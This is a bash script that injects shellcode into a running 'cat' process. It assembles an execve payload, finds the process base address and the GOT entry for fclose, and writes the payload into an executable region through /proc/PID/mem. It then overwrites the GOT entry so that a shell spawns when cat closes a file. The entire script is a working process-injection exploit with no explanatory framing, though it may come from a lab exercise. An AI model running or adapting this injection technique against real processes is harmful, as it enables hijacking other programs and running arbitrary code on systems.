#!/bin/bash

PID=$1

if [ -z "$PID" ]; then
  echo "Usage: $0 <PID of cat process>"
  exit 1
fi
echo "Found cat process with PID: $PID"

echo "Compiling shellcode..."
as -o execve.o execve.s || {
  echo "Failed to assemble execve.s"
  exit 1
}
ld -o execve execve.o || {
  echo "Failed to link execve.o"
  exit 1
}
objcopy -O binary execve loader.bin || {
  echo "Failed to create loader.bin"
  exit 1
}

MAPS_INFO=$(cat /proc/$PID/maps | grep '/bin/cat' | head -n 1)
if [ -z "$MAPS_INFO" ]; then
  echo "Failed to find /bin/cat in process memory map"
  exit 1
fi

FILE_BASE_ADDR=$(echo "$MAPS_INFO" | awk '{print $1}' | cut -d'-' -f1)
if [ -z "$FILE_BASE_ADDR" ]; then
  echo "Failed to find file base address for /bin/cat"
  exit 1
fi

echo "Cat file base address: 0x$FILE_BASE_ADDR"
BASE_DEC=$((16#$FILE_BASE_ADDR))

FCLOSE_PLT_ADDR=$(objdump -d /bin/cat | grep "<fclose@plt>" | head -n 1 | awk '{print $1}')
if [ -z "$FCLOSE_PLT_ADDR" ]; then
  echo "Failed to find address of fclose@plt"
  exit 1
fi
FCLOSE_PLT_OFFSET=$((16#${FCLOSE_PLT_ADDR}))
echo "fclose@plt offset in binary: 0x$(printf "%x" $FCLOSE_PLT_OFFSET)"

FCLOSE_PLT_REAL_ADDR=$((BASE_DEC + FCLOSE_PLT_OFFSET))
FCLOSE_PLT_REAL_HEX=$(printf "0x%x" $FCLOSE_PLT_REAL_ADDR)
echo "fclose@plt address in memory: $FCLOSE_PLT_REAL_HEX"

PLT_JMP_ADDR=$((FCLOSE_PLT_REAL_ADDR + 4))
echo "Reading jmp instruction at: 0x$(printf "%x" $PLT_JMP_ADDR)"

if [ ! -f ./find_got ]; then
  gcc -o find_got find_got.c || {
    echo "Failed to compile find_got.c"
    exit 1
  }
fi

GOT_OFFSET=$(./find_got /bin/cat fclose)
if [ -z "$GOT_OFFSET" ]; then
  echo "Failed to find GOT offset for fclose"
  exit 1
fi

echo "GOT offset found: $GOT_OFFSET"
GOT_OFFSET_DEC=$((16#${GOT_OFFSET#0x}))
GOT_ADDR=$((BASE_DEC + GOT_OFFSET_DEC))
GOT_HEX=$(printf "0x%x" $GOT_ADDR)
echo "GOT address for fclose: $GOT_HEX"

CODE_REGIONS=$(cat /proc/$PID/maps | grep "r-xp" | grep -v "/lib")
ENTRY_ADDR=0

for REGION in $CODE_REGIONS; do
  REGION_START=$(echo "$REGION" | awk '{print $1}' | cut -d'-' -f1)
  REGION_END=$(echo "$REGION" | awk '{print $1}' | cut -d'-' -f2)
  REGION_START_DEC=$((16#$REGION_START))
  REGION_END_DEC=$((16#$REGION_END))

  SHELLCODE_SIZE=$(stat -c %s loader.bin)
  PADDING=16
  REQUIRED_SIZE=$((SHELLCODE_SIZE + PADDING))

  MIDDLE_OFFSET=$(((REGION_END_DEC - REGION_START_DEC) / 2))
  ENTRY_ADDR=$((REGION_START_DEC + MIDDLE_OFFSET))

  if [ $((REGION_END_DEC - ENTRY_ADDR)) -gt $REQUIRED_SIZE ]; then
    break
  fi
done

if [ $ENTRY_ADDR -eq 0 ]; then
  echo "Failed to find a suitable code cave"
  exit 1
fi

ENTRY_HEX=$(printf "0x%x" $ENTRY_ADDR)
echo "Shellcode injection address: $ENTRY_HEX"

ADDR_HEX=$(printf "%016x" $ENTRY_ADDR)
REVERSED_HEX=""
for ((i = 14; i >= 0; i -= 2)); do
  REVERSED_HEX="${REVERSED_HEX}${ADDR_HEX:$i:2}"
done
echo -ne $(echo $REVERSED_HEX | sed 's/../\\x&/g') >pc.bin

if [ ! -s pc.bin ]; then
  echo "Failed to create pc.bin"
  exit 1
fi
echo "Created pc.bin with shellcode address"

dd if=loader.bin of=/proc/$PID/mem conv=notrunc bs=1 seek=$ENTRY_ADDR 2>/dev/null || {
  echo "Failed to write loader.bin to memory"
  exit 1
}
echo "Injected shellcode at address $ENTRY_HEX"

dd if=pc.bin of=/proc/$PID/mem conv=notrunc bs=1 seek=$GOT_ADDR 2>/dev/null || {
  echo "Failed to write pc.bin to GOT entry"
  exit 1
}
echo "Overwrote GOT entry for fclose at $GOT_HEX"
echo "Shell should spawn when cat closes a file"
